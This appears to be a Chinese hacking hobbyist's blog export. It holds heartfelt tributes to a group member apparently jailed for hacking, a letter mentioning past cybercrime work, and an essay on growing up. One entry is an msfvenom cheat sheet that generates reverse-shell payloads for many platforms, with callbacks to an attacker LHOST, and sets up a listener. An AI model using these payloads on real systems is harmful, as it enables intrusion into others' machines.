也有很多想对你说的话，你也知道这些搞技术的并不是每一个都像我一样有写作这个天赋，能将自己的情感通过文字表达出来。但是真的不代表他们没有想法，我让他们尽量开心的表达一下，不要太煽情了。毕竟大家要一起快乐的走下去，不是吗？那么以下就是他们各自想对你说的话，也希望你能够看到。</p><p>首先是“426”听说我要写这么一个关于Bge 的文，他说自己也有想说的，但是憋了半天，才憋了两个字。在他的记忆中，和你聊天第一句话就是“Bge”，“干嘛”，“草泥马”，然后每日成就（1/1）。但是，426 一直强调，你对他有恩。以下是他的原话：不知道是14年还是15年，有幸接触到渗透吧，也有幸加入了渗透吧新手集中营。不知道什么原因，突然被吧主拉入了大风车的群，也不知道这是不是一种缘分，能够跟着里面的各种朋友一起度过了这一年又一年。最开始在里面看见Bge，然而我叫他B哥，是因为他很多很多时候都会发自己正在学的东西到群里面，对于当时的我来说，都很高端，很不可及，所以我叫他B哥。Bge是个很不错的人，挺正直年轻的一个朋友，至少在我看来，他还是一个挺单纯很容易接触的。在刚入群的1年中，总是和B哥他们撕逼，一直到后来，请教过B哥几个问题，B哥也是知无不言，哪怕是很不能泄露的那种也都和我交流过，所以对B哥一直印象不错，毕竟是入群后第一个撕逼开玩笑的人。所以，我真的很想他。</p><p>Bge你猜猜下一个是谁，当然是那个我们的“小可爱”了，很让人高兴的是，现在他终于不是那个臭傻吊了，终于和自己喜欢很久的女神在一起了。不过为了女神的幸福，天天三餐吃饼，也成为了被我们鄙视的笑料。小可爱，在你出事以后真的可能是最不安的了，基本每天都在群里说想你。接下来也是他的原话，我也原封不动的发出来：Bge，NPLT，哈哈，又见面了，我是你的乘客，记不记得你每天给我开车了，我那段时间特别开心的呢！听说Bge的名字还是大姐和老大看直播给你起的呢，从一开始的不认识到老司机的过程是多么美好的一段回忆。我们每天的斗图，互黑，都是那么的美好，记不记得我给你买的细说PHP，我可是看着你从小白变成技术牛的过程，我每天傻不拉几的问你弱智的问题，你还一直给我解答，有什么新的发现也提前告诉我，我多么激动啊！看着你在我电脑上的360之行，多崇拜你。你为人也老实，对大家都挺好的，我曾经多么想和你见一面，现在想想真是后悔以前没见过你，现在暂时也没机会了，不过相信有一天我终究会找到你的，请你去大保健哈哈哈，请你吃大餐，你要好好的，要知道我们都在想你，欢迎你回来一起互黑，小司机在这里等老司机回来开车，等你，等你，等你。。。。</p><p>然后是“iceH”，或许Bge你对他的印象是停留在这小子手机上有抢红包外挂，每次有人发红包，无论什么时间，他总是第一个抢到，然后屁都不放一个。但是他和你一样，都是一个懂奋斗，爱钻研都年轻小伙。在得知你的消息以后，也曾牵肠挂肚，也有一肚子的话想对你说：关于Bge吧，在我的映像中是个很逗而且乐于帮助他人的人。记得那时候刚进大风车，有许多问题的时候，问他的时候，他总是会很有耐心的帮忙解决。前段时间听说你进去了，起初我也没在意，以为你是有事没办法上QQ了。但渐渐的，发现你不发言了，也不装逼了，QQ达人也灭了，这个时候我开始慌了。每次看到大师智，就会想起你。愿你早日回归我们大风车这个家庭，我们全体成员等你回来。        </p><p>下一个是我们的“表姐”拉，最近她正在为了制作她的光立方和激光电子琴而绞尽脑汁呢。说起表姐，一个很喜欢写工具，动手能力十足，很有想法的小青年。你是否还记得她博客里自己制作的小游戏2048中还有你头像的小方块呢，你对应的是2048中的32，每次合成到32就能再次看到你那个装b 的头像了。表姐爱动漫，所以她的头像都是一些我也搞不清是什么的动漫角色，但是打开她的博客，你会发现，这扑面而来的还TM的还是动漫角色呀。不过这次我认识，那是可爱并且文武双全的土间埋，小埋（《干物妹！小埋》女主）。一个在家总是披着仓鼠斗篷，二头身，懒惰，任性的熊孩子形象。不过是个性格温柔并且头脑很好，无可挑剔的美少女高中生。Bge，你说实话，想不想找一个这样的女朋友……好了，接下来是表姐想对你说的原话哦：在我印象中，Bge是一个很逗逼又很爱装逼的人，在我知识浅薄的时候帮助我很多，也帮助过大风车很多人，在Bge那我学到了很多渗透知识（现在大多都忘了，2333~），我非常感谢Bge对我的帮助，很怀念Bge装逼的样子，告诉Bge表姐想他。我们在等你回来！</p><p>我们的个人showtime大告白怎么能少了你的好基友“大师智”呢。这个坏小子，现在已经在某某某公司上班了，然而dog改不了吃屎，还是会在上班时间干点其他的屁事。“纠结的坏”这个名字曾经一度成为我们黑他的一个点，到底他在初中年少时候有多么的非主流才能起一个这样子骚气的名字，不得不说他年少时候一定有很多段不堪回首的往事。你们在一起搞事情的日子发生点点点滴滴或许也只有你们彼此懂，就让往事随风而去吧。Bge我知道你好强，没事，大师智这小子到现在还是单身呢，你那么帅分分钟撩一个哪有什么问题。好了，下面是他给你的原话：Bge嘛，嘿嘿嘿。我依然还记得那个中午，临上课前帮Bge提权的事，记得上面有狗，加不上账户，只能修改密码了。不过厚道的我当然没有这么做了，只是把方法告诉了碧哥。从此我们也就一起坐上了友谊的小船。还有就是开语音的时候，那一口“标准”的普通话，用四川话来说，你就是个蛤蟆皮。再然后，就是那段时间，好几次直播被打脸，233333.最后的最后，许久不见，不知你可好，我永远一直都会在大风车等你！</p><p>还记得那个身处高中牢笼之中，依然在周末捣腾他钟爱都渗透的小Y吗。没错哦，现在他也考上了自己心仪的大学满意的专业。我和小Y认识的真的很早，他真的是我在认识你之前，我认为最努力和最勇于去追梦的小伙子。虽然我在认识你之后还是觉得他最有潜力，哈哈哈。和你一样，爱钻研不放弃也是他的标签，不过，仔细想想，我们大风车里的哪一个人又不是这样呢。“总有一天我们为之奋斗和努力的目标，会反过来拥抱我们。”这是我们这一波人始终坚信的真理。当然了，我们的小Y也有许多想对你说的：</p><p>[To our Bge：不知不觉，你也已经消失联系好几个月了！不知道何时能见到你那头像闪烁在我的列表中 ！哎！</p><p>Bge，我和你虽然不太熟，但也算是一起玩过的朋友。大家都相识在我们曾经的“大风车”中！那个时候的你，与我们扯淡，与我们共同进步，与我们一起有说有笑 ！但现在都已经是过去时了！我不得不感叹物是人非啊！</p><p>遇到狗蛋是你这个人生中，可谓最大的转折点。把你捧到了你的巅峰，然而却不知道交友不慎的后果居然有如此之大！想起你的牢狱之灾我就不断叹息，真的第一次知道时心里一震，就像缺了什么似得，很不安生。</p><p>【属于你的回报】</p><p>遇到狗蛋后，据我了解，你们关系真的很不错。就是因为你的你热于助人，而狗蛋呢，他来者不拒（先不谈论关于狗蛋）所以自然而然玩得不错。你为他做了很多事情，你们一起日高权的站。随着你的技术与名声越来越大，圈子里的人了知道“狗蛋”还有你这个朋友“NPLT”，这是外人对你的尊称。在接下来的这年，你为他论坛录制视频，操心不少。在补天的团队获奖被邀去京，你当之无愧的作为代表人去了。你知道当时我们有多么的羡慕你能站上那个舞台，见识这么大场面，可以说现在我的目标之一，还是可以获此殊荣 。</p><p>我依然记得那天的颁奖直播，我看到了羞涩的Bge， 紧张的在颁奖现场，我们一群人看着直播，夸着这么帅气的你，看着这么高大的你。哎！肯定这段日子也是你最开心的时候了，但是接下来……</p><p>【谁也想不到的遭遇】</p><p>终于到了最悲伤的阶段。你与他的关系与日俱增，越来越好。却不知道为他扛得锅越来越多 ，可是你却没有看清楚他在利用你们（此处省略甲乙丙）扩大自己的名气。</p><p>但是我失策了，我真的失策了！我知道他干的勾当，我也知道他有后台。但是我不知道，在你，这个与他玩了日日夜夜的，我们的Bge出事的时候，他没有选择保你。他为了自己的利益，完全没有考虑过你，甚至现在依然逍遥，没有半点悔意。我到现在都没有看到他发过任何感慨，就像无所谓似得 ？ WTF “你还我们的Bge！”</p><p>事已至此，说什么也没用了。你遭遇此难，也算是不公平的老天给你的试炼，但是我们依然痛心。</p><p>其他没什么，我相信你一定能挺过来，我们会等着你回来的 ！</p><p>——————-致我们的永远的Bge ]</p><p>不知道Bge你看到这里，面对大伙的真情流露是否已经内牛满面，至少也应该明白了自己不寂寞了吧。当然了，我们的大风车里还有一个不会尬舞的“魔法天女”—队长！现在我也忘记了，队长这个名字是从何而来的了，但是这个来自中国传媒大学的少女总是能给我们的平静的生活带来一点刺激和多彩。我不管她现在是那个穿着破裤子还让外婆缝的大姑娘，还是开着狂拽酷炫屌炸天摩托车的狂野女郎。“队长”这两个字，和你Bge一样，都和我们大风车牢牢地挂勾在了一起。替你抱不平的是她，替你呐喊的也总是她。你空间还保留着和她的那张酷酷的合照，也是她每次想你时候可以看看的地方。或许“队长”坚韧的心让她不会替你哭泣，但是她却有无数的话想对你诉说：（由于队长暂时出去玩了，没把想说的发给我，二改必然补上，尽请期待！）</p><p>最后想对你两句的当然还有我们的老大了，毕竟boss总是压轴出场的。回想起每次我和老大出去吃饭，谈论到你，剩下的也只有惋惜。现在老大工作忙了加上有了家庭，也没有太多的时间和我们在“大风车”里愉快的玩耍了，但是他还是总出现在我们最需要帮助的时候。当我们遇到瓶颈的时候，他的一两句指点，往往就能让我们遇到问题迎刃而解。老大话不多，但是句句精辟，他想对你说的就一句话：“唉！成天骂人傻逼最后自己当了傻逼。”或许，这句话看似好笑，但是却包含了老大对你的惋惜和意味深长。人生如棋，一步走错了，满盘皆输？我看未必，命运始终是把握在自己的手上，即使是失去一切也不意味着缺憾，何况你还没有失去一切，你至少还剩下等待你回来的亲人和我们这一群朋友，难道不是吗？</p><p>大风车里还有一些小伙伴有很多话想对你说的，但是由于工作的忙碌，无法表达。我也替他们将千言万语汇成一句话：Bge，大风车永远是你的家，等你回来！</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf的各种生成payload命令</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/msf%E7%9A%84%E5%90%84%E7%A7%8D%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/msf%E7%9A%84%E5%90%84%E7%A7%8D%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4.html</url>
    
    <content type="html"><![CDATA[<p>Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.</p><a id="more"></a><p>List payloads</p><p>msfvenom -l</p><h2 id="Os-Payloads"><a href="#Os-Payloads" class="headerlink" title="Os Payloads:"></a>Os Payloads:</h2><p><strong>Linux</strong></p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p><strong>Windows</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p><strong>Mac</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><h2 id="Web-Payloads："><a href="#Web-Payloads：" class="headerlink" title="Web Payloads："></a>Web Payloads：</h2><p><strong>PHP</strong></p><p><code>  msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p><strong>ASP</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p><strong>JSP</strong></p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p><strong>WAR</strong></p><p><code>  msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><h2 id="Scripting-Payloads"><a href="#Scripting-Payloads" class="headerlink" title="Scripting Payloads:"></a>Scripting Payloads:</h2><p><strong>Python</strong></p><p><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p><strong>Bash</strong></p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p><strong>Perl</strong></p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode:"></a>Shellcode:</h2><p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p><p><strong>Linux Based Shellcode</strong></p><p><code>  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Windows Based Shellcode</strong></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p><strong>Mac Based Shellcode</strong></p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><h2 id="Handlers："><a href="#Handlers：" class="headerlink" title="Handlers："></a>Handlers：</h2><p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p><p><code>  use exploit/multi/handler set PAYLOAD &lt;Payload name&gt; set LHOST &lt;LHOST value&gt; set LPORT &lt;LPORT value&gt; set ExitOnSession false exploit -j -z</code></p><p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我想说的话，我的大风车</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E6%88%91%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%88%91%E7%9A%84%E5%A4%A7%E9%A3%8E%E8%BD%A6.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E6%88%91%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%88%91%E7%9A%84%E5%A4%A7%E9%A3%8E%E8%BD%A6.html</url>
    
    <content type="html"><![CDATA[<p>原文:<br>我今年23岁，毕业两年，做过运维，做过安全，做过手机，也做过黑产。<br>会web渗透，会脚本语言，会Windows/Linux底层安全运维，会安卓框架<br>爱跑步，爱极限运动，爱计算机，爱网络。</p><p>21岁，刚刚出来工作，之前做黑产积累了一点资本，一通公安的电话，我成了什么都没有的应届找工作的大学生。</p><a id="more"></a><p>我去过智联招聘当服务器运维技术员，去过智联安防做过网络安全总监，最后在机锋网当了一名第三方rom框架组组长。我跑过手机发布会，待过线下座谈会，也低着头去大公司帮忙做安全，和两年前相似，我又有了一点在这个社会上活下来的需要的最重要的东西。</p><p>今年5月，我父亲退休了，我和我女朋友准备结婚了，6月3号，我们领证了。7月11日，我们办了订婚宴，10月28号，我们本该结婚了，家里出事了。两年累计下来的资本，又化为泡影。这次，现在不是什么都没有，是我欠了别人许多许多。</p><p>她说，没有关系，什么时候办婚宴都可以，先把事情解决了。<br>我向机锋预支了4个月工资加所有奖金，经理同意了。他说，360你去不了了，除非你能把这4个月该做的，在1月份前完成，现在，快了。<br>进入社会，快3年了，可能这些跟真正大起大落的人比不算什么，可是我真的累。</p><p>穷途末路，没有地方借钱，我试着在网络上找那些朋友帮忙，可是，他们不认识我了，一个都不认识了。我无心组建的一个QQ群，他叫大风车，随意打的名字。里面除了学生，还是学生，根本就没有见过面的人。可是他们却帮我了，虽然还不足凤毛麟角，可是他们确实帮了我。现在稍微缓和了一点，可是事还没有解决，不过他们已经帮了我最多最多了。<br>今晚的事还没有做完，很累，只能不停的点烟提神，突然看到那个图标，想起那天夕阳下的奔跑。我想说点话，也想找个地方把我的累说出来，还想对大风车的人说点话，虽然有二十来个人，可是，我却只记得这几个。</p><p>小Y：<br>&emsp;&emsp;其实你刚刚进来的时候，我记得是一个钻阔，是不是你我还真想不起来了，那时候大风车人也多，大家不停的嘲讽，可是你却没有发飙，只是不停的说那是以前不懂，现在要学习技术。现在大风车那么团结了，我也看到你的成长，你的好学，你的努力，也在我困难的时候给了大风车这个集体给予我最大的帮助，真要送你一个祝福，我希望你考上自己喜欢的大学，喜欢的专业。再找一个女朋友，哪天你可以和我说，老大，我找到女朋友了。</p><p>大师智：<br>&emsp;&emsp;什么时候开始这么叫你的，具体哪天想不起来了，只记得我很喜欢一个游戏解说叫小智，他那天上了大师在直播，于是你说你自己是大师智，就一直这样叫着了。我时常黑你，怎么黑好玩就怎么来，你也别生气，尊敬是留给陌生人的，好朋友才互相黑着玩的你说对吧。你太懒了，找点时间给自己补点墨水，虽然大风车是一个朋友的集体，可我的初衷是培养一些人。</p><p>碧哥：<br>&emsp;&emsp;同样也是叫大师智开始，这么叫你的。你很逗比，我很喜欢这样乐观的人，我完全看不到你的成长，我感觉你遇到95后突然一下子变成一个人人喊大牛的碧哥，可是你几斤几两现在好像能摸的清楚，别膨胀，你总有真正是大牛的一天，还有，快找个女朋友，天天用大师智送的娃娃，容易漏气。</p><p>表哥：<br>&emsp;&emsp;是不是现在都流行叫哥了啊，碧哥就算了还有个表哥。希望你做你想做的，以后如果公司缺运维，我第一个推荐你，问题尽管向我问，我真看不见，你抖我一下都成。<br>表姐：<br>&emsp;&emsp;刚刚说要表哥就说表姐了，也许你现在在题海，看不见，我也希望你和小Y一样，考上自己想去的大学。</p><p>土豆：<br>&emsp;&emsp;你是大风车的老人了，我对你的印象是沉默寡言的人，一个问题爱一直研究的人，或许你不是，只是不经常出现了，记忆中你是工作了吧，忙了就很难顾及到别的了，一起为了生活拼搏吧！</p><p>jame_xhs：<br>&emsp;&emsp;妈的你这名字也太长了，就不能有一个朗朗上口的称呼吗。我们有共同的爱好，我们都喜欢手机，喜欢他的外观工艺，喜欢他的软件系统，能找到一个同爱好的人，本来就是人生中一件难得的事，多冒泡，大风车是一个大家庭，每个人的关系都应该一样，每一个话题大家都应该能一起说。加油！</p><p>95：<br>&emsp;&emsp;和你认识的时间不长，不过也谢谢你信得过我，也谢谢你帮过我，我们目前的状态一样，你为梦想拼，我为生活拼，都是拼搏。一月份，我给你一个sss团队核心该有的样子，给你一个sss团队讲师该有的进度，共勉！</p><p>疯子：<br>&emsp;&emsp;我对你没有什么印象，不过在我困难的时候QQ私聊我需要帮助吗，现在还是很感激你的，真的，我对你没有什么印象，只知道你是大风车群里的一员，也知道你喜欢健身，我一直希望大风车是一个大家都是好朋友的地方，虽然只是网络，可能虚无缥缈，可是朋友缺不是虚无缥缈的东西。</p><p>小可爱：<br>&emsp;&emsp;我一直觉得你是一个很有想法的人，总感觉你和同龄人不一样，也很努力，我一直觉得当初我学习技术的时候已经很努力了，可是我做不到晚上12点睡第二天7点就可以起来看php，不管是不是一时而起的干劲，他都是你努力的象征，同样的，我也希望你的生活好一点，至少比我好，不是一点，是很多。</p><p>iceH：<br>&emsp;&emsp;我告诉你，你这个名字太low了。我不记得怎么加的你，还是你加的我，只记得你混迹在许多的娱乐圈里面，动不动就什么黑客精神的娱乐圈，还爱邀请我，那时候真的烦。不过你现在好像有一点转变，有没有混迹我不知道，至少没有对我进行邀群DDOS了，你需要改变的是技术，技术好了，你邀请我进黄色直播群我都不在意。</p><p>虫二：<br>&emsp;&emsp;感谢你在努力适应大风车，每一个后来进入大风车的人都希望能学好技术，不过可能让你失望了，还真没学到，我忙到没有时间教你们，偶尔有时间还尽和大家扯蛋，别怪我，进了大风车就是好朋友，好朋友的知识总会分享给你的。</p><p>小队长：<br>&emsp;&emsp;别生气你是最后一个，主角都是最后出场的，也别问大姐呢？这是我写给大风车的人，大姐是我穿一条内裤长大的兄弟，有什么心里话，我会直接对他说。你是集体里面唯一的女孩，也是我最疼的妹妹，我可以黑任何人，就是不会黑你，任何人也不可以黑你，大师智敢欺负你，我第一个剁他的猪屌，我希望你开开心心的，活好每一天，你有什么要求，我能做到的，尽量做，晚上早点睡，女孩的皮肤和身体很重要的，我很爱听你和我倾诉你的生活，也谢谢你可以听我生活的辛苦。你一直是最漂亮可爱的，谁说不是，和大师智一样，把他挂树上剁屌。大风车一开始是一个技术的集合，可是却意外成为一个大家庭，可是我不忘初衷，一直希望你们学好技术，你不同，你的任务就是卖萌打扮，做自己开心想做的事，哪天找到你爱的人，爱你的人，别把我这个老大忘记了。</p><p>这一直是我想对你们说的心里话，可能有点心灵鸡汤了，好像这不是那个天天爱开玩笑没事讲几个黄段子的我了，不过我还是觉得，网络不是友谊的鸿沟，是好朋友就是好朋友，哪来那么多别的事，见不见过又怎样，是否了解又怎样，至少我们聊起天来很开心。差不多了，点根烟，继续把没做完的事做完。</p><p>  谢谢你们听我说心里话，谢谢你们能了解我，谢谢你们叫我老大。</p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——永远旋转的大风车</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我们都长大了</title>
    <link href="/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E6%88%91%E4%BB%AC%E9%83%BD%E9%95%BF%E5%A4%A7%E4%BA%86.html"/>
    <url>/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E6%88%91%E4%BB%AC%E9%83%BD%E9%95%BF%E5%A4%A7%E4%BA%86.html</url>
    
    <content type="html"><![CDATA[<p>我们都成了大人，不是原来打打闹闹了，不管做什么，都牵扯到钱，牵扯到自己身边的人安全与否。狐朋狗友多了，真正的兄弟少了，以前的同学也不联系了，会打架，会和父母吵架，在家里也不经常和家里人说话了，不再像小时候腻着爸妈，和父母的关系越来越差，晚上睡觉的时候，想到之前父母那严厉的面容，枕头上总会湿一片。</p><p>我们都成了大人，都有了自己的梦想，有了自己的理想，原本无趣的生活有了一丝乐趣。为了自己的理想在拼搏，在努力，在学习。可能父母的不理解，总是阻碍我们。这不怪他们，他们只是为了我们好。</p><a id="more"></a><p>我们都成了大人，开始越来越愁眉苦脸，每天维持着烦恼。为了理想努力而遇到瓶颈，生活的劳累奔波，甚至头发的长度，鞋子的颜色都成了我们所要烦恼的事情。压力大了，身边的人不再问你考了多少分，而是问成就怎么样，快毕业了准备去哪里就业，哪所重点高中的，哪所名牌大学的，哪所大公司的。</p><p>我们都成了大人，开始各种故事一连串的出现在我们生活中，有好的，有坏的。有爱我的人，有伤害过我的人，被这个鸡巴社会弄的现实的我们，都已经是大人了。成长的路总是有挫折，而我们的这个年龄，似乎已经被各种困难，各种挫折弄的麻木了。小时候的同情心似乎越来越不见了，见到街上的什么破产大学生，断了条胳膊就出来乞讨的人，不会像小时候那么同情他们，甚至翻出口袋仅有的几块零花钱毫不心疼的扔进他们的碗里、包里。现在的我们，总会想很多。管我屁事？自己的搞不定自己还去管别人？破产？你有胳膊右腿有脑袋你不会去找事情做？至少养活自己，放下尊严来乞讨？你他妈还是个人？断条胳膊就不能干事了？收破烂都比这个强。成了大人的我们，发现自己想的更多了，是福是祸？</p><p>我们都成了大人，我们知道了，在生活面前，一切挫折和困难都不残酷，看重的是过程而不是结局，只要活着，有着尊严，那些都不算什么。我们都感谢那些伤害过，爱过我们的人，我们会感谢那首让我们振作、感动流涕的歌。</p><p>一眨眼，时间不等人，我们都成了那小时候崇拜，期盼，那所谓的大人。</p>]]></content>
    
    
    <categories>
      
      <category>胡思乱想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
